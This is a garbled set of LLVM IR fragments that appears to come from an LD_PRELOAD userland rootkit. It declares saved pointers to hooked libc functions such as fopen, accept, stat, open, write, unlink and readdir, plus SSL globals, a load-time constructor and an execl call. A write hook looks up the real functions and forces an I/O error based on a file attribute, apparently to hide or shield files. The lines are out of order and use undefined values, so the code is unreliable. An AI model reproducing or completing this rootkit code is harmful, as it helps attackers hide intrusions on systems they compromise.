@libc = common global i8* null, align 8
@ssl = common global %struct.ssl_st* null, align 8
@ctx = common global %struct.ssl_ctx_st* null, align 8
@old_fopen = internal global %struct._IO_FILE* (i8*, i8*)* null, align 8
@old_accept = internal global i32 (i32, %struct.sockaddr*, i32*)* null, align 8
@old_access = internal global i32 (i8*, i32)* null, align 8
@old_xstat = internal global i32 (i32, i8*, %struct.stat*)* null, align 8
@old_fopen64 = internal global %struct._IO_FILE* (i8*, i8*)* null, align 8
@old_fxstat = internal global i32 (i32, i32, %struct.stat*)* null, align 8
@old_write = internal global i64 (i32, i8*, i64)* null, align 8
@old_fxstat64 = internal global i32 (i32, i32, %struct.stat64*)* null, align 8
@old_lxstat = internal global i32 (i32, i8*, %struct.stat*)* null, align 8
@old_lxstat64 = internal global i32 (i32, i8*, %struct.stat64*)* null, align 8
@old_open = internal global i32 (i8*, i32, i32)* null, align 8
@old_rmdir = internal global i32 (i8*)* null, align 8
@old_xstat64 = internal global i32 (i32, i8*, %struct.stat64*)* null, align 8
@old_unlink = internal global i32 (i8*)* null, align 8
@old_unlinkat = internal global i32 (i32, i8*, i32)* null, align 8
@old_fdopendir = internal global %struct.__dirstream* (i32)* null, align 8
@old_opendir = internal global %struct.__dirstream* (i8*)* null, align 8
@old_readdir = internal global %struct.dirent* (%struct.__dirstream*)* null, align 8
@old_readdir64 = internal global %struct.dirent64* (%struct.__dirstream*)* null, align 8
@llvm.global_ctors = appending global [1 x { i32, void ()*, i8* }] [{ i32, void ()*, i8* } { i32 65535, void ()* @init, i8* null }]
  %64 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i8* null) #8
store i32 %14, i32* %fildes, align 8
store  i8* %15, i8** %buf, align 8
store  i64 %22, i64* %nbyte, align 8
  %1 = alloca i64, align 8
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %s_fstat = alloca %struct.stat, align 8
  store i32 %fildes, i32* %2, align 4
  store i8* %buf, i8** %3, align 8
  store i64 %nbyte, i64* %4, align 8
  %5 = load i8*, i8** @libc, align 8
  %6 = icmp ne i8* %5, null
  %9 = call i8* @dlopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), i32 1) #8
  store i8* %10, i8** @libc, align 8
  %18 = load i8*, i8** @libc, align 8
  %19 = call i8* @dlsym(i8* %18, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0)) #8
  %22 = bitcast i8* %20 to i64 (i32, i8*, i64)*
  store i64 (i32, i8*, i64)* %22, i64 (i32, i8*, i64)** @old_write, align 8
  %29 = load i8*, i8** @libc, align 8
  %30 = call i8* @dlsym(i8* %29, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #8
  %33 = bitcast i8* %31 to i32 (i32, i32, %struct.stat*)*
  store i32 (i32, i32, %struct.stat*)* %33, i32 (i32, i32, %struct.stat*)** @old_fxstat, align 8
  %39 = load i32 (i32, i32, %struct.stat*)*, i32 (i32, i32, %struct.stat*)** @old_fxstat, align 8
  %40 = load i32, i32* %2, align 4
  %41 = call i32 %39(i32 1, i32 %40, %struct.stat* %s_fstat)
  %44 = getelementptr inbounds %struct.stat, %struct.stat* %s_fstat, i32 0, i32 5
  %45 = load i32, i32* %44, align 8
  %46 = icmp eq i32 %45, 7
  %49 = call i32* @__errno_location() #9
  store i32 5, i32* %50, align 4
  store i64 -1, i64* %1, align 8
